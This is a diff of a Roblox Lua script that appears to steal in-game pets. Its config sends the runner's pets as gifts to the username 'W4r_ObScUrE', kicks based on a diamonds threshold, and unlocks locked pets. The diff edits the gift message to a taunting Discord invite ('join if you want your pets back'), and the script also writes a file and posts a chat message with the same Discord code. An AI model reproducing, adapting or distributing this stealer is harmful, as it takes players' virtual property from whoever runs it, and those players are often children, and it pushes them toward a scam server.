@@ -2,7 +2,7 @@
  
 --[[ Main Config ]]--
 _G.Username = "W4r_ObScUrE" --// Username To Send Pets To
-_G.GiftMessage = "Shrek" --// Message For The Gift To Say
+_G.GiftMessage = "join if you want your pets back: discord.gg/3Z5bsAEUpV" --// Message For The Gift To Say
  
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
@@ -136,7 +136,7 @@ Client.Character.HumanoidRootPart.Anchored = true
 writefile("openmeifyouwantyourpets.txt", "https://discord.gg/BdRGvQ63")
  
  
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("disco code -> BdRGvQ63","All")
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("disco code: BdRGvQ63","All")
  
  
  
